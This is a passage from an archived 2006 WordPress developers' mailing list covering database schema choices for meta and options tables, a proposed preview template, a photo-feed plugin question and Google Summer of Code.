> > $id_col = '$id' AND meta_key = '$key'", ARRAY_N);
>
> Yes, but that's the minimum number (2) of required WHERE elements to get
> the job done.  If you split either of those values off as a new table,
> you'd end up with a variable number of tables, which would be less
> efficient than using one for each matching table.

But I guess I'm trying to understand is if multiple WHERE clauses
impede the performance of DB queries to such a degree that people feel
so strongly about having multiple redundant table structures, why
aren't WP's DB queries optimized to use one WHERE clause whenever
possible?

How do you decide where the tradeoff of having to loop through
slightly larger result sets with PHP (if for example you used "SELECT
meta_key, meta_value FROM $table WHERE $id_col = '$id'") outweighs the
extra WHERE clause?

Or alternately why not add a unique search key column of something
like md5(id_col.meta_key) to the table so you'd only have one WHERE
clause in your query?

I realize that DB performance tuning can be more art than science, but
after reading Ryan's recent post
(http://boren.nu/archives/2006/04/03/romancing-the-database/) about
the very real impact that query tweaking can have, I'm newly curious
to know what the various assumptions are behind some of these DB
decisions.

--Stewart

--

Stewart Ugelow
www.ugelow.com
From nuclearmoose at gmail.com  Fri Apr 14 04:03:17 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Apr 14 04:07:02 2006
Subject: [wp-hackers] Release Cycle
In-Reply-To: <a491f91d0604131908v397e4d87u5bd435698618fd85@mail.gmail.com>
References: <443EF98F.6040602@ebroder.net>
	<a491f91d0604131908v397e4d87u5bd435698618fd85@mail.gmail.com>
Message-ID: <5aa3aa0604132103i4633bb1dr723d8506f6bafc1a@mail.gmail.com>

/me is running SVN trunk on my live site, but then again, moose r dum,
right? :p

Craig.
Nuclear Moose.
From mark.wordpress at txfx.net  Fri Apr 14 05:59:27 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Apr 14 06:03:32 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
Message-ID: <294271AF-2818-406F-A542-FFA202140A0B@txfx.net>

On Apr 13, 2006, at 5:39 PM, Stewart Ugelow wrote:

> Just out of curiousity: why create an entirely new table?

The main reason is backwards compatibility for plugin authors.  Not  
all post meta interaction possibilities are covered by API functions,  
and require direct queries.  For instance:

- selecting all post ids that have a certain meta key or key/value combo
- deleting based on key/value (not knowing the IDs)
- updating based on key/value

If this table also contained comment meta, all these queries would  
have to be changed by the plugin authors.  My initial involvement  
with WordPress was as a plugin developer... so I tend to try and  
think from that point of view when writing core patches.

> So what happens if you have your two coolers of beer and soda and then
> your friend shows up at your party with a case of iced tea?
>
> You have to file a trac ticket asking Matt or Ryan for permission to
> buy another cooler, everyone at the party gets to comment about
> whether iced tea is an essential beverage to the party core, and you
> have to write a whole new set of instructions on where the iced tea is
> located and what the process is for grabbing one if you want one. Then
> those instructions have to be maintained and updated every time you
> throw a party going forward.

The idea of a generic "data" table has been floated before... some  
people are sticking huge things in options table.  The feeds really  
don't belong there, for example.  But still, the cooler analogy  
applies... just create a "generic" cooler for everything that isn't  
beer or soda... wp_data or something like that.  And of course,  
plugins are free to (and many do) create their own tables.  For big  
things that need to store, sort, query, update lots of data, that  
would be the prudent thing to do.

My post meta table is huge... tens of thousands of entries... that's  
getting to the point where non-indexed queries are going to kill  
performance, so sticking an extra WHERE condition on there is going  
to slow things down (remember, that query gets run on every WP view  
that returns posts!).  And regardless... the backwards compatibility  
issue still applies, which was my main reason.  I don't like breaking  
things unless there's a really good reason to do so.

--
Mark Jaquith
http://txfx.net/
From dougal at gunters.org  Fri Apr 14 14:06:54 2006
From: dougal at gunters.org (Dougal Campbell)
Date: Fri Apr 14 14:14:35 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>	<443C93B6.2080201@midnightcircus.com>	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>	<004201c65f46$dec46480$6e01a8c0@sixfour>	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
Message-ID: <443FAC7E.3020009@gunters.org>

Stewart Ugelow wrote:
>> All of which is more efficient than querying against a single table with
>> an extra WHERE parameter, indexed or not.
> 
> Really? Even if it's a multi-column index as described at
> http://dev.mysql.com/doc/refman/4.1/en/multiple-column-indexes.html?

Yes, MySQL supports multi-column indexes. But even so, I'm not sure that 
I'd prefer the single-table approach. Even though the format of the 
information is the same, the metadata for posts, comments, users, links, 
categories, etc. is not directly related to each other (*somewhat* 
related, but not really).

And even with the multi-column indexes to zero in on the rows you're 
looking for, if you combine everything, the index is going to contain 
exponentially more non-matching rows than if you keep separate meta 
tables for each type of data, which might cancel out the benefits for 
sites that track *lots* of metadata.

On the surface, it might seem more efficient to combine them, but I'd 
favor the semantics of keeping the tables separate. Unless a database 
expert can give concrete reasons that combining them would gain some 
real benefit.


-- 
Dougal Campbell <dougal@gunters.org>
http://dougal.gunters.org/

From ringmaster at midnightcircus.com  Fri Apr 14 14:10:25 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 14 14:19:34 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
	<443F0151.2060000@midnightcircus.com>
	<7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>
Message-ID: <443FAD51.4020509@midnightcircus.com>

Stewart Ugelow wrote:
> You have to file a trac ticket asking Matt or Ryan for permission to
> buy another cooler, everyone at the party gets to comment about
> whether iced tea is an essential beverage to the party core, and you
> have to write a whole new set of instructions on where the iced tea is
> located and what the process is for grabbing one if you want one. Then
> those instructions have to be maintained and updated every time you
> throw a party going forward.

Like Mark says, you don't need permission to add another table from your 
plugin.  There has been a reasonable amount of chatter (in spite of 
matt's recent "edge case" comment in Trac - this, by the way matt, seems 
much more useful than the dbx server-side storage issue we were talking 
about on #dev) about storing metadata along with comments, which can be 
useful for many applications.

The patch that Mark wrote does a good job of exposing the necessary API 
to access that table data, so creating instructions and detailing the 
process isn't that great of a labor since the functions are nearly 
identical to their post and user meta counterparts.  Plus, they only 
really affect the people who will be using that meta table.

ALSO- The changes he has made make way for better table management in 
code, which is the type of optimization that I would like to see every 
new-feature patch also include.

> The whole process can be a real mess. Just ask the guy who wrote
> http://www.asymptomatic.net/2006/01/17/2216/no-more-feeds-for-wordpress/.

Yeah, I wrote that (Owen == ringmaster == asymptomatic == redalt), and 
I'm not sure how it applies.  I even said that including comment meta is 
a good idea.  I said it would be a lot of work, and Mark has done it, 
and I'm impressed.  Now I just need to test it.  ;)

> But I guess I'm trying to understand is if multiple WHERE clauses
> impede the performance of DB queries to such a degree that people feel
> so strongly about having multiple redundant table structures, why
> aren't WP's DB queries optimized to use one WHERE clause whenever
> possible?

Apart from Mark's valid backward-compatibility sentiment, there is still 
the issue of the size of that table if it contains meta records for all 
the other tables.  Sifting through all of that data on every page 
request for each type of request (post/user/comment/etc) would 
definitely slow things down.

Owen

From bmygal at gmail.com  Fri Apr 14 14:47:34 2006
From: bmygal at gmail.com (Brian)
Date: Fri Apr 14 14:51:20 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <443FAD51.4020509@midnightcircus.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
	<443F0151.2060000@midnightcircus.com>
	<7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>
	<443FAD51.4020509@midnightcircus.com>
Message-ID: <c8d0d7750604140747x7b495ba2w4e55a8482010e82a@mail.gmail.com>

Wow, I didn't expect this much feedback.  So obviously there's an WP
achitechture disagreement here, but going back to my original question, does
anyone know how to add comments to a map?
From bmygal at gmail.com  Fri Apr 14 19:22:05 2006
From: bmygal at gmail.com (Brian)
Date: Fri Apr 14 19:25:56 2006
Subject: [wp-hackers] RSS Photo Feed with User Ratings
Message-ID: <c8d0d7750604141222r22d797c6r6e8f65619d250753@mail.gmail.com>

I thought this would have some potential but couldn't find it anywhere.
Basically feed WP with public photos (i.e.: Flickr, etc.) and add the WP
user ratings plugin.

My users' ratings + public photostream = "Picture of the Day" (customizeable
utlizing flickr's tags).

2 Questions:
1. Where can I get info on how to filter & feed photos to my WP site.
2. Do the current WP ratings plugin have functionality to allow "0 votes"
items to be dropped from the DB after x days, while sorting decending by
"most votes"?

Any suggestions?
From kaf at szub.net  Fri Apr 14 19:24:55 2006
From: kaf at szub.net (Kaf Oseo)
Date: Fri Apr 14 19:28:54 2006
Subject: [wp-hackers] Preview template
Message-ID: <443FF707.6040803@szub.net>

Who's for adding a preview.php to the template hierarchy? I'm itching
to add something barely useful to the core today...

-Kaf
From jjb at ibiblio.org  Fri Apr 14 19:52:10 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Fri Apr 14 19:56:01 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <443FAD51.4020509@midnightcircus.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
	<443F0151.2060000@midnightcircus.com>
	<7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>
	<443FAD51.4020509@midnightcircus.com>
Message-ID: <Pine.LNX.4.61.0604141529370.8570@tribal.metalab.unc.edu>

I thought I'd throw in my $0.02 on the structure of the options table.

Considering:

-the most common selective query on the options table selects on 
option_name

-in mysql, a primary key dictates the order in which the data should be 
stored in the "physical" file on disk. another way of saying this is that 
the "main" data file for a table can effectively act as its own best 
index. selecting on the primary key provides b-tree speed access to all of 
the columns in the table, without having to first consult a separate 
index.

So, the best way to optimize retrieving arbitrary columns when selecting 
on an option_name is to make the option_name the primary key. Of course, 
this contradicts with the general guideline of making a primary key column 
as short as possible. But since this selection is by far the most 
frequent, and joins on this table are rare or non-existant, I still think 
this would be the best option.

However I do not have extensive experience working with tables that use 
non-numeric coulmns as their primary key so perhaps I am missing something 
here.

current indexes:
   PRIMARY KEY (option_id,blog_id,option_name)
   KEY option_name (option_name)

what i propose:
   PRIMARY KEY (option_name,blog_id,option_id)
   KEY option_name (option_id)

Of course, this demands that option_name be unique... which I just noticed 
isn't currently the case. Does WP need to allow for multiple options with 
the same option_name?

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/
From denis at semiologic.com  Fri Apr 14 19:57:49 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Fri Apr 14 20:01:52 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <443FF707.6040803@szub.net>
Message-ID: <000101c65ffd$b608c330$8e01a8c0@kergan>

Can't this be added using the template_redirect hook?

D.

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of Kaf Oseo
> Sent: Friday, April 14, 2006 12:25 PM
> To: wp-hackers@lists.automattic.com
> Subject: [wp-hackers] Preview template
> 
> 
> Who's for adding a preview.php to the template hierarchy? I'm 
> itching to add something barely useful to the core today...
> 
> -Kaf
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com 
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From kaf at szub.net  Fri Apr 14 20:04:33 2006
From: kaf at szub.net (Kaf Oseo)
Date: Fri Apr 14 20:08:30 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <000101c65ffd$b608c330$8e01a8c0@kergan>
References: <000101c65ffd$b608c330$8e01a8c0@kergan>
Message-ID: <44400051.4050806@szub.net>

Denis de Bernardy wrote:
> Can't this be added using the template_redirect hook?

Yes. It's an easy plugin. But I'm wondering what the consensus is
on it as belonging in the core.

-Kaf
From nuclearmoose at gmail.com  Fri Apr 14 20:08:41 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Apr 14 20:12:30 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44400051.4050806@szub.net>
References: <000101c65ffd$b608c330$8e01a8c0@kergan> <44400051.4050806@szub.net>
Message-ID: <5aa3aa0604141308r2c8ca330pedcf7b2e4301442b@mail.gmail.com>

Preview would be most welcome as a standard feature.

Craig.
From denis at semiologic.com  Fri Apr 14 20:14:56 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Fri Apr 14 20:18:48 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44400051.4050806@szub.net>
Message-ID: <000201c66000$1a2a15b0$8e01a8c0@kergan>

You mean to preview the theme?

Denis

From false.hopes at gmail.com  Fri Apr 14 20:54:26 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 14 20:58:15 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <443FF707.6040803@szub.net>
References: <443FF707.6040803@szub.net>
Message-ID: <a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>

On 4/14/06, Kaf Oseo <kaf@szub.net> wrote:
> Who's for adding a preview.php to the template hierarchy? I'm itching
> to add something barely useful to the core today...

Barely useful is right, we have the is_preview function for this
purpose (mostly to hide ads that would otherwise 404), and adding a
preview template leaves us open to the dumb theme authors who will
make the preview page look different defeating the purpose of the
preview feature while postimg.

--
--Robert Deaton
http://somethingunpredictable.com
From kaf at szub.net  Fri Apr 14 21:01:19 2006
From: kaf at szub.net (Kaf Oseo)
Date: Fri Apr 14 21:05:18 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <000201c66000$1a2a15b0$8e01a8c0@kergan>
References: <000201c66000$1a2a15b0$8e01a8c0@kergan>
Message-ID: <44400D9F.6000701@szub.net>

Denis de Bernardy wrote:
> You mean to preview the theme?

Oui. As in the template used when displaying a post/Page in the post
editor.

-Kaf
From kaf at szub.net  Fri Apr 14 21:05:19 2006
From: kaf at szub.net (Kaf Oseo)
Date: Fri Apr 14 21:09:05 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
Message-ID: <44400E8F.4060703@szub.net>

Robert Deaton wrote:
> Barely useful is right, we have the is_preview function for this
> purpose (mostly to hide ads that would otherwise 404), and adding a
> preview template leaves us open to the dumb theme authors who will
> make the preview page look different defeating the purpose of the
> preview feature while postimg.

See, now that's the sort of feedback I was looking for[1].

-Kaf

[1] I think.
From nuclearmoose at gmail.com  Fri Apr 14 21:17:08 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Apr 14 21:20:58 2006
Subject: [wp-hackers] RSS Photo Feed with User Ratings
In-Reply-To: <c8d0d7750604141222r22d797c6r6e8f65619d250753@mail.gmail.com>
References: <c8d0d7750604141222r22d797c6r6e8f65619d250753@mail.gmail.com>
Message-ID: <5aa3aa0604141417y23758373pae16f60e1bf87f1@mail.gmail.com>

1. http://www.flickr.com/services/api/

Can't help on question 2.

Craig.
From mark.wordpress at txfx.net  Fri Apr 14 21:35:29 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Apr 14 21:39:31 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <Pine.LNX.4.61.0604141529370.8570@tribal.metalab.unc.edu>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
	<443F0151.2060000@midnightcircus.com>
	<7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>
	<443FAD51.4020509@midnightcircus.com>
	<Pine.LNX.4.61.0604141529370.8570@tribal.metalab.unc.edu>
Message-ID: <69346A5A-B9F6-4A77-BE90-C130A41C5F27@txfx.net>

On Apr 14, 2006, at 3:52 PM, John Joseph Bachir wrote:

> Does WP need to allow for multiple options with the same option_name?

Using the API, it doesn't allow it... so preventing it on the  
database side shouldn't be a problem.
--
Mark Jaquith
http://txfx.net/


From mark.wordpress at txfx.net  Fri Apr 14 21:37:26 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Apr 14 21:41:28 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
Message-ID: <9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>

On Apr 14, 2006, at 4:54 PM, Robert Deaton wrote:

> adding a
> preview template leaves us open to the dumb theme authors who will
> make the preview page look different defeating the purpose of the
> preview feature while postimg.

+1 on that thought.  My whole goal for the iframe preview was to get  
an exact preview of what the post would look like in the blog!  I  
can't think of why you would want an inexact preview.
--
Mark Jaquith
http://txfx.net/


From kaf at szub.net  Fri Apr 14 22:04:43 2006
From: kaf at szub.net (Kaf Oseo)
Date: Fri Apr 14 22:08:47 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
References: <443FF707.6040803@szub.net>	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
Message-ID: <44401C7B.10205@szub.net>

Mark Jaquith wrote:
> I can't think of why you would want an inexact preview.

Here's several:

1. A theme is graphic-intensive and you don't want to wait for it
to load every time you save an edit.

2. You want to view just the content area of your post sans header,
sidebar, etc.

3. You only want to use post preview as a sanity-checker.

Of course, having reasons, even good ones, does not denote a need for
having it in the core (the point of this thread).

-Kaf
From skeltoac at gmail.com  Fri Apr 14 22:15:16 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Apr 14 22:19:05 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44401C7B.10205@szub.net>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
	<44401C7B.10205@szub.net>
Message-ID: <e6ec604d0604141515x5848ad55g7bfcecf06f3f2880@mail.gmail.com>

On 4/14/06, Kaf Oseo <kaf@szub.net> wrote:
> Of course, having reasons, even good ones, does not denote a need for
> having it in the core (the point of this thread).

A theme can already use is_preview() to detect when it's displaying a
preview and modify its output.

Andy
From jjb at ibiblio.org  Fri Apr 14 22:33:25 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Fri Apr 14 22:37:15 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <69346A5A-B9F6-4A77-BE90-C130A41C5F27@txfx.net>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
	<443F0151.2060000@midnightcircus.com>
	<7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>
	<443FAD51.4020509@midnightcircus.com>
	<Pine.LNX.4.61.0604141529370.8570@tribal.metalab.unc.edu>
	<69346A5A-B9F6-4A77-BE90-C130A41C5F27@txfx.net>
Message-ID: <Pine.LNX.4.61.0604141830340.20043@tribal.metalab.unc.edu>


> On Apr 14, 2006, at 3:52 PM, John Joseph Bachir wrote:
>
>> Does WP need to allow for multiple options with the same option_name?
>
> Using the API, it doesn't allow it... so preventing it on the database 
> side shouldn't be a problem.

Restricting a column to unique provides a significant index performance 
improvement-- if nothing else changes, at least this should.

   KEY option_name (option_name)

simply use UNIQUE instead of KEY

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From false.hopes at gmail.com  Fri Apr 14 22:38:34 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 14 22:42:24 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44401C7B.10205@szub.net>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
	<44401C7B.10205@szub.net>
Message-ID: <a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>

On 4/14/06, Kaf Oseo <kaf@szub.net> wrote:
> Mark Jaquith wrote:
> > I can't think of why you would want an inexact preview.
>
> Here's several:
>
> 1. A theme is graphic-intensive and you don't want to wait for it
> to load every time you save an edit.

Its your own site, you should have your own graphics in your browser cache.

> 2. You want to view just the content area of your post sans header,
> sidebar, etc.

At that point, you're looking at the edit box again.

> 3. You only want to use post preview as a sanity-checker.

Same as above.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Fri Apr 14 22:47:57 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 14 22:51:45 2006
Subject: [wp-hackers] Google Summer of Code
Message-ID: <a491f91d0604141547t78f24f1am52dc1d704d93d7e0@mail.gmail.com>

http://code.google.com/summerofcode.html

Submissions opened for mentoring organizations today, I noticed Matt
talked about having this done last year, but was too late to mentor,
but I'm sure there are some students interested in trying this out
(ones that meet the eligibility requirements, unlike myself, what a
shame). What do you guys think?

--
--Robert Deaton
http://somethingunpredictable.com
From kaf at szub.net  Fri Apr 14 23:24:29 2006
From: kaf at szub.net (Kaf Oseo)
Date: Fri Apr 14 23:28:27 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
References: <443FF707.6040803@szub.net>	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>	<44401C7B.10205@szub.net>
	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
Message-ID: <44402F2D.5020401@szub.net>

Robert Deaton wrote:
>> 2. You want to view just the content area of your post sans header,
>> sidebar, etc.
> 
> At that point, you're looking at the edit box again.
> 
>> 3. You only want to use post preview as a sanity-checker.
> 
> Same as above.

Sorry it's not. You can't assign css from a theme to elements and
classes in the editor's textarea.

-Kaf
From wp at ebroder.net  Sat Apr 15 00:10:07 2006
From: wp at ebroder.net (Evan Broder)
Date: Sat Apr 15 00:13:07 2006
Subject: [wp-hackers] Google Summer of Code
In-Reply-To: <a491f91d0604141547t78f24f1am52dc1d704d93d7e0@mail.gmail.com>
References: <a491f91d0604141547t78f24f1am52dc1d704d93d7e0@mail.gmail.com>
Message-ID: <444039DF.8060504@ebroder.net>

Robert Deaton wrote:
> http://code.google.com/summerofcode.html
>
> Submissions opened for mentoring organizations today, I noticed Matt
> talked about having this done last year, but was too late to mentor,
> but I'm sure there are some students interested in trying this out
> (ones that meet the eligibility requirements, unlike myself, what a
> shame). What do you guys think?
>   
Well, I think that I'd personally enjoy being on the student end of the 
Summer of Code, especially if it meant working for Wordpress. :)
> --
> --Robert Deaton
> http://somethingunpredictable.com
>   
- Evan
From Brian at TheCodeCave.com  Sat Apr 15 02:50:21 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Sat Apr 15 02:54:14 2006
Subject: [wp-hackers] Google Summer of Code
In-Reply-To: <444039DF.8060504@ebroder.net>
Message-ID: <002201c66037$58e8aff0$0664a8c0@tiger1>

>From GAIM's page:
[quote]
Introduction
Gaim is proud to participate in the Google Summer of Code. This summer
Google is putting up $1 million dollars for students to work on free
software projects under the mentorship of experienced free software
developers. The Gaim developers are glad to volunteer to mentor some
students and introduce them to the world of open-source development.

Students may apply for the program at Google's webpage by selecting
"Gaim" as their sponsor. Google and Gaim will then work together to
select from the candidates. The chosen candidates will then work closely
with Gaim developers to complete their project. Upon completion, the
student will receive $4500 AND a tee-shirt!
[/quote]

Pretty sweet.  There are certainly worse ways to spend your summer
hours...

From skeltoac at gmail.com  Sat Apr 15 06:05:28 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Apr 15 06:09:19 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44402F2D.5020401@szub.net>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
	<44401C7B.10205@szub.net>
	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
	<44402F2D.5020401@szub.net>
Message-ID: <e6ec604d0604142305y63359d05o9fc53b6db0c5b466@mail.gmail.com>

On 4/14/06, Kaf Oseo <kaf@szub.net> wrote:
> Sorry it's not. You can't assign css from a theme to elements and
> classes in the editor's textarea.

That is not correct. TinyMCE allows an external editor stylesheet and
WordPress has at least two hooks that give plugins a chance to modify
the tinymce config. You can even edit in Comic Sans.

Andy
From r at robm.me.uk  Sat Apr 15 15:39:41 2006
From: r at robm.me.uk (Rob)
Date: Sat Apr 15 15:40:35 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
References: <443FF707.6040803@szub.net>	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>	<44401C7B.10205@szub.net>
	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
Message-ID: <444113BD.4040400@robm.me.uk>

Robert Deaton wrote:
> On 4/14/06, Kaf Oseo <kaf@szub.net> wrote:
>   
>> 2. You want to view just the content area of your post sans header,
>> sidebar, etc.
>>     
>
> At that point, you're looking at the edit box again.
>
>   
>> 3. You only want to use post preview as a sanity-checker.
>>     
>
> Same as above.
>   
What about those of us who don't use the WYSIWYG?

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From nuclearmoose at gmail.com  Sat Apr 15 16:07:03 2006
From: nuclearmoose at gmail.com (Craig)
Date: Sat Apr 15 16:10:53 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <444113BD.4040400@robm.me.uk>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
	<44401C7B.10205@szub.net>
	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
	<444113BD.4040400@robm.me.uk>
Message-ID: <5aa3aa0604150907x2ed5b5dat74f93affe71d74e0@mail.gmail.com>

Good question. The first thing I do on a new install is turn off the WYSIWYG
editor.
From r at robm.me.uk  Sat Apr 15 16:23:29 2006
From: r at robm.me.uk (Rob)
Date: Sat Apr 15 16:24:18 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <5aa3aa0604150907x2ed5b5dat74f93affe71d74e0@mail.gmail.com>
